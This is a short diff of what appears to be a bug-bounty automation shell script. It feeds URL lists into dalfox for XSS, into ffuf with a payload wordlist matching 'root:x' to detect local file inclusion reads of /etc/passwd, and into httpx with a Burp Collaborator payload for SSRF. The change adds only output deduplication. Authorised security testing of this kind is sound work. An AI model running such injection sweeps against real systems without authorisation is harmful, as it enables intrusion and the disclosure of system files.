@@ -14,13 +14,13 @@ dalfox file XSS.txt -o XSS_Inject_Response.txt;
 
 # LFI automation
 cat LFI.txt | qsreplace FUZZ | while read url ; do
-  ffuf -u $url -mr "root:x" -w payloads_wordlist.txt -o LFI_Inject_Response.txt
+  ffuf -u $url -mr "root:x" -w payloads_wordlist.txt -o LFI_Inject_Response.txt | anew LFI_new_Response.txt
 done
 
 
 # SSRF automation
 cat SSRF.txt | qsreplace "Burp collaborator payload" | while read url ; do
-  httpx -u $url --status-code -o SSRF_Inject_Response.txt
+  httpx -u $url --status-code -o SSRF_Inject_Response.txt | anew SSRF_Inject_anew_Response.txt
 done
 
 # SSTI injection
